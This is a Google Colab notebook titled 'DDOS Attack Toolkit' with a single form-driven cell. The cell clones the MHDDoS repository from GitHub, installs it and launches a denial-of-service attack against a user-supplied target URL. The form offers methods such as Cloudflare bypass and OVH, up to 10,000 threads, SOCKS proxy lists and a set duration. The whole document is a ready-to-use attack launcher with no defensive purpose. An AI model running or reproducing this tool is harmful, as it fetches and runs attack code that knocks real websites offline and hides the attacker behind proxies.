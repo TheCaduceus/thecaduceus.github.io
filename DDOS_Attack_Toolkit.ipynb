{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/TheCaduceus/thecaduceus.github.io/blob/main/DDOS_Attack_Toolkit.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# User Data INPUT\n",
        "Repo_author = \"MHProDev\" #@param [\"TheCaduceus\", \"MHProDev\"]\n",
        "Use_repo = \"MHDDoS\" #@param [\"MHDDoS\"]\n",
        "METHOD = \"OVH\" #@param [\"OVH\", \"CFBUAM\", \"CFB\", \"GET\", \"POST\", \"STRESS\", \"DYN\", \"DOWNLOADER0\", \"SLOW\", \"HEAD\", \"NULL\", \"COOKIE\", \"PPS\", \"EVEN\", \"GSB\", \"DGB\", \"AVB\", \"BOT\", \"APACHE\", \"XMLRPC\", \"BYPASS\", \"BOMB\", \"KILLER\"]\n",
        "TARGET_URL = \"\" #@param {type:\"string\"}\n",
        "THREADS = 10000 #@param {type:\"slider\", min:100, max:10000, step:1}\n",
        "Use_Proxy_List = \"socks5.txt\" #@param [\"socks5.txt\", \"socks4.txt\", \"socks3.txt\"]\n",
        "RPC = \"100\" #@param {type:\"string\"}\n",
        "DURATION_Seconds = \"500\" #@param {type:\"string\"}\n",
        "# Setup\n",
        "!git clone https://github.com/{Repo_author}/{Use_repo}.git\n",
        "%cd {Use_repo}\n",
        "!pip install -r requirements.txt\n",
        "# Output\n",
        "print(\"--Attack Started!--\")\n",
        "!python3 start.py {METHOD} {TARGET_URL} 1 {THREADS} {Use_Proxy_List} {RPC} {DURATION_Seconds}"
      ],
      "metadata": {
        "cellView": "form",
        "id": "goeeH6s5mCEy"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "accelerator": "GPU",
    "colab": {
      "collapsed_sections": [],
      "name": "DDOS Attack Toolkit.ipynb",
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}